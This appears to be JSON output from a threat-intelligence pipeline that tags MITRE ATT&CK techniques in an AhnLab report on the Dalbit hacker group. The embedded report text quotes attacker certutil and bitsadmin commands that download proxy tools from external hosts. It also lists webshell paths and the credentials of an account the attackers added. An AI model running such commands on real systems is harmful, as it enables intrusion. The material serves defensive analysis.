              "bitsadmin.exe"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ca3ee8ac-daab-403a-8ee4-497413758b31",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "System Utilities",
            "attack_id": "T1127",
            "tactic": "Execution",
            "description": "Detected use of Certutil",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.077,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Certutil",
              "certutil.exe"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a0c708f5-89bc-4601-a618-764830395967",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Scheduled Task",
            "attack_id": "T1053",
            "tactic": "Execution",
            "description": "Detected use of At",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.077,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "At",
              "at.exe"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c5a9136d-8bc1-420a-80f4-da4da5a12d1f",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Exploitation for Client Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "Detected use of MetaSploit",
            "confidence_score": 0.634,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.077,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "MetaSploit"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "9a26d4e2-c2a0-48b9-954b-191b8f81447c",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "02b00e9a-b8b3-422e-b4f4-089892d95f9d",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "b33132b7-88be-44e5-bf65-898bd404ce52",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "10c35bc1-92f9-4fbf-8aac-dfd19c8c27b1",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "9b47d6d2-6a6e-46ec-894b-c88c93bf3765",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Windows Management Instrumentation",
            "attack_id": "T1047",
            "tactic": "Execution",
            "description": "Detected Windows Management Instrumentation activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "fd14d389-d45c-49b3-840c-4af46575dcd0",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "OS Credential Dumping",
            "attack_id": "T1003",
            "tactic": "Credential Access",
            "description": "Detected OS Credential Dumping activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "716c3243-5447-4556-9fa7-aeb88316f75e",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Network Service Discovery",
            "attack_id": "T1046",
            "tactic": "Discovery",
            "description": "Detected Network Service Discovery activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "43d737c8-d885-49e2-9ecb-a3d162998734",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "69f06b42-48ae-47f6-a8a8-26111ee5a4d9",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Scheduled Task/Job",
            "attack_id": "T1053",
            "tactic": "Persistence",
            "description": "Detected Scheduled Task/Job activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "53fa7c2a-f0e2-4da9-8bb2-a789f1506f5d",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Account Discovery",
            "attack_id": "T1087",
            "tactic": "Discovery",
            "description": "Detected Account Discovery activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "ac513977-d418-419d-bb4f-55ac6a87c6b2",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Remote Services",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "Detected Remote Services activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "10a8fc2e-31e1-4bcb-a7a6-d6593374b7b2",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "Detected Screen Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "e565872e-ff6d-419a-98cc-7fcb18ec076a",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Registry Run Keys",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Detected Registry Run Keys activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "0068cf68-42e9-4fb5-8d2f-94a62c3ca1eb",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Remote Desktop Protocol",
            "attack_id": "T1021.001",
            "tactic": "Lateral Movement",
            "description": "Detected Remote Desktop Protocol activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "2363783e-2739-4f08-94b6-e5663298de11",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 1 7 By kingkimgim February 13  2023 Dalbit (m00nlight): Chinese Hacker Group s APT Attack Campaign asec.ahnlab.com/en/47455 0. Overview This report is a continuation of the  Attackers Using FRP (Fast Reverse Proxy) to Attack Korean Companies  post that was uploaded on August16  2022 and follows the group s activities since that post. This group has always relied on open-source tools and lacked any distinct characteristics to profile them due to the lack of PDB information.Additionally  the amount of information that could be collected was limited unless the affected Korean companies specifically asked for aninvestigation since the threat actor s C2 (Command Control) server abused the servers of the Korean companies. However  after the post wasuploaded and a portion of the Korean company servers used by the threat actor were blocked  the threat actor began to use a hosting servercalled   .m00nlight.top  as their C2 and download server. Thus  the ASEC team decided to call this group Dalbit (m00nlight.top) after theKorean word for  Moonlight . This group has had more than 50 confirmed attack attempts on Korean companies since 2022. Most of the attacked companies were mid tosmall companies while a portion was major companies. The team has confirmed that 30  of the infected companies were using a certainKorean groupware solution. It is currently difficult to check whether this groupware product has a vulnerability or not  but if a server that isthis exposed has a vulnerability  then there is a chance that companies could be affected gravely through the leakage of confidentialinformation and ransomware behavior. Furthermore  this Dalbit group leaves some infected companies as proxies and download servers tolater use them as means to communicate with the threat actor upon infiltration of another company. Therefore  we strongly recommend performing an internal security check if users suspect that they have been attacked by this Dalbit group.The team asks that users send a report to AhnLab and take preemptive measures to prevent secondary harm and potential damage to othercompanies. 1. Affected Korean Companies (Industry Type) Listed below are the 50 companies that were confirmed to have been affected since 2022. Companies that have not been clearly confirmed wereexcluded from this list. It is possible that more companies could have been affected. Figure 1. Industry types of companies that the Dalbit group tried to attack The following are the descriptions of each industry type. Technology: Companies that handle software or hardwareIndustrial: Manufacturing companies that handle machinery  paint jobs  steel  metals  etc.Chemical: Cosmetic  pharmaceutical  and plastic companiesConstruction: Associations or organizations related to construction or construction companiesAutomobile: Automobile-related manufacturing companiesSemiconductor: Semiconductor-related manufacturing companies 2 / 1 7 Education: Educational companiesWholesale: WholesalersMedia: Printing and media companiesFood: Food companiesShipping: Shipping companiesHospitality: Leisure or tourist accommodation companiesEnergy: Energy companiesShipbuilding: Shipbuilding companiesConsulting: Management consulting companies 2. Flow and Characteristics 2.1. Summary Diagram Figure 2. Summary diagram of Dalbit group s infiltration process The above diagram shows the threat actor s infiltration process into Company B. A brief summary of this flow is in the table below. 1) Initial Access The threat actor targets web servers or SQL servers  which they gain access to by exploiting vulnerabilities. They thenattempt to control the systems with tools such as WebShell.2) Command   Control Various hacking tools are downloaded through WebShell. Hacking tools include various binaries such as privilege escalationtools  proxy tools  and network scanning tools.3) Proxy   Internal Reconnaissance Proxy: The threat actor installs a proxy tool such as FRP (Fast Reverse Proxy) before attempting to connect to 2-1) a hostingserver built by the threat actor or 2-2) another previously infected company s server (Company A) via Remote Desktop (RDP). Internal Reconnaissance: Tools such as network scanning tools and account theft tools are used for internal reconnaissanceand obtaining information.4) Lateral Movement The obtained information is used to move to another connectible server or PC. Afterward  a proxy tool (FRP) is also installedon the PC that has successfully been reached through lateral movement  creating an environment which allows the threatactor to connect via RDP. The required privilege level is then acquired by either adding a specific account or through acredential theft tool like Mimikatz.5) Impact Ultimately  after the threat actor steals all the information they desire  they use BitLocker to lock certain drives and demand aransom. Table 1. Explanation of the infiltration summary diagram The following are major characteristics of the Dalbit group. 2.2. Characteristics of Dalbit 3 / 1 7 List Description Threat Actor s C2 ServersDownload and C2 (Command Control) servers: Korean company or hosting serversOver half of these servers are exploited Korean company servers .m00nlight.top or IP format addresses are often used for the hosting servers Attempts Control Through RDPUsually attempts to access RDP after infectionEither a proxy tool or Gotohttp is used for RDP connection Proxy Tools Major proxy tools used include FRP  LCX (Htran) NPS  ReGeorg   etc. Add User AccountA net command is used to add an accountAccount credentials (ID:  main  / PW:  ff0.123456 ) Open-source Tool Mostly uses open-source tools that are publicly availableA lot of tools are written in Chinese Evasion VMProtect is used to prevent hacking tools from being detectedSecurity event logs are deleted Extorted InformationUser account credentialsEmail informationScreen leakInstalled program information Table 2. Characteristics of Dalbit 3. Tools Used and Infiltration Process 3.1. Tools and Malware Used WebShellDownloader Privilege EscalationProxyInternal Reconnaissance Godzilla ASPXSpy AntSword China Chopper Certutil (Windows CMD) Bitsadmin (Windows CMD)BadPotato JuicyPotato SweetPotato RottenPotato EFSPotato CVE-2018-8639 CVE-2019-1458 FRP LCX NPS ReGeorg FScan NbtScan TCPScan Goon Nltest (Windows CMD) Lateral MovementInformation Leak and CollectionBackdoorFile EncryptionEvasion RDP PsExec RemCom Winexec Wevtutil (Windows CMD) WMI (Windows CMD) ProcDump DumpertEML Extractor (created) MimikatzRsync CobaltStrike MetaSploit BlueShell Ladon BitLocker (Windows CMD)Security log deletion (Windows CMD) Firewall OFF (Windows CMD) Attempts to delete AV products VMProtect Packing Table 3. Malware and hacking tools used by Dalbit Only one tool for leaking emails seems to have been made by the group themselves. The rest are normal Windows programs or tools that caneasily be found online. 3.2. Infiltration Process 3.2.1. Initial Infiltration It is assumed that their attack targets are usually servers with a specific Korean groupware installed on them  email servers (Exchange Server) and SQL servers. The threat actor exploited either file upload vulnerabilities or WebLogic vulnerabilities such as CVE-2017-10271 to uploadtheir WebShell. A portion appeared to have used a SQL server command prompt (xp_cmdshell). The most frequently used WebShells are Godzilla  ASPXSpy  AntSword  and China Chopper in that order. Aside from these  several otherWebShells were also found. The installation paths of the WebShells are as follows. 4 / 1 7   Job recruitment (File upload vulnerability)D:\\WEB\\        recruit\\css\\1.ashxD:\\WEB\\        recruit\\css\\4.ashxD:\\WEB\\        recruit\\common\\conf.aspx...  File upload vulnerabilityD:\\UploadData\\           \\    _File\\Data\\Award\\1.ashxD:\\UploadData\\           \\    _File\\Data\\Award\\2.aspxD:\\UploadData\\           \\    _File\\Data\\Award\\3.aspxD:\\  WebService\\        \\     Editor\\sample\\photo_uploader\\File\\conf.aspxD:\\  WebService\\        _ThesisSubmission\\Include\\file.aspx...  Certain groupwareD:\\Web\\(Groupware)\\cop\\1.ashxD:\\Web\\(Groupware)\\app\\4.ashxD:\\Web\\(Groupware)\\bbs\\4.asmxD:\\Web\\(Groupware)\\erp\\tunnel.aspx (ReGeorg)D:\\inetpub\\(Groupware)\\image\\2.asmxD:\\inetpub\\(Groupware)\\image\\2.aspxC:\\(Groupware)\\Web\\(Groupware)\\cop\\conf.aspxC:\\(Groupware)\\Web\\(Groupware)\\cop\\1.ashxC:\\(Groupware)\\Web\\(Groupware)\\cop\\1.asmxC:\\(Groupware)\\Web\\(Groupware)\\cop\\1.aspx   Email server (Exchange Server)D:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\aa.aspxD:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\11.aspxC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NETFiles\\root\\91080f08\\2694eff0\\app_web_defaultwsdlhelpgenerator.aspx.cdcab7d2.sjx_41yb.dllC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\91080f08\\2694eff0\\app_web_ldaj2kwn.dll   WeblogicD:\\   \\wls1035\\domains\\            \\servers\\       \\tmp\\            \\uddiexplorer\\gcx62x\\war\\modifyregistryhelp.jspD:\\   \\wls1035\\domains\\            \\servers\\       \\tmp\\            \\wls-wsat\\zfa3iv\\war\\eee.jspD:\\   \\wls1035\\domains\\            \\servers\\       \\tmp\\            \\wls-wsat\\zfa3iv\\war\\error.jspD:\\Oracle\\          \\user_projects\\domains\\             \\servers\\WLS_FORMS\\tmp\\            \\wls-wsat\\tcsxmg\\war\\123.jspD:\\Oracle\\          \\user_projects\\domains\\             \\servers\\WLS_FORMS\\tmp\\            \\wls-wsat\\tcsxmg\\war\\test.jsp D:\\Oracle\\          \\user_projects\\domains\\             \\servers\\WLS_FORMS\\tmp\\            \\wls-wsat\\tcsxmg\\war\\aaa.jsp   TomcatC:\\(Tomcat)\\webapps\\dd\\sb.jspC:\\(Tomcat)\\webapps\\ddd\\index.jspC:\\(Tomcat)\\webapps\\docs\\update.jspC:\\(Tomcat)\\webapps\\tmp\\shell.jsp Table 4. Paths where WebShells were uploaded 3.2.2. Download The threat actor downloads other hacking tools through default Windows programs. Since WebShells are normally used in infiltration  parentprocesses  excluding command processes like cmd  are run by web server processes such as w3wp.exe  java.exe  sqlserver.exe  andtomcat .exe. The downloaded files include privilege escalation tools  proxy tools  and network scanning tools  all of which are required by thethreat actor. The download command is as follows. (Additionally  the full addresses of the Korean companies that have been exploited will not be disclosed.) 1) Certutil   certutil -urlcache -split -f hxxp://www.ive   .co[.]kr/uploadfile/ufaceimage/1/update.zip c:\\programdata\\update.exe (frpc)   certutil -urlcache -split -f hxxp://121.167.   [.]   /temp/8.txt c:\\programdata\\8.ini (frpc.ini)   certutil -urlcache -split -f hxxp://103.118.42[.]208:8080/frpc.exe frpc.exe   Table 5. Certutil download log 2) Bitsadmin   bitsadmin /transfer mydownloadjob /download /priority normal  hxxp://91.217.139[.]117:8080/calc32.exe  c:\\windows\\debug\\winh32.exe  (frpc)   bitsadmin /transfer mydownloadjob /download /priority normal  hxxp://91.217.139[.]117:8001/log.ini  c:\\windows\\debug\\log.ini  (frpc.ini)   Table 6. Bitsadmin download log 5 / 1 7 The hacking tools and malware downloaded by the threat actor were usually found in the following paths.  ALLUSERSPROFILE  SystemDrive \\temp  SystemDrive \\perflogs  SystemDrive \\nia  SystemDrive \\.tmp SystemRoot   SystemRoot \\debug  SystemRoot \\temp Table 7. Major directories used by the Dalbit group Therefore  the files in these paths should be checked if users suspect that they have been infiltrated. 3.2.3. Privilege Escalation and Account Addition The threat actor mainly used Potato (BadPotato  JuicyPotato  SweetPotato  RottenPotato  EFSPotato) and PoC (CVE-2018-8639  CVE-2019-1458)  which has been published on GitHub  for privilege escalation. After privilege escalation  they characteristically add the followingaccount. The below sp.exe is the SweetPotato tool.   sp.exe  whaomi  (Privilege check)   